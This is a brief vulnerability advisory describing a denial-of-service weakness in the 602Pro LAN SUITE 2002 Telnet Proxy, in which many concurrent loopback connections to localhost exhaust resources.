The 602Pro LAN SUITE 2002 Telnet Proxy is reported to be prone to a denial of service condition. It is possible for proxy users to use the loopback interface to connect to localhost. If a large number of these connections are made concurrently, it is possible to cause a denial of service via resource exhaustion.
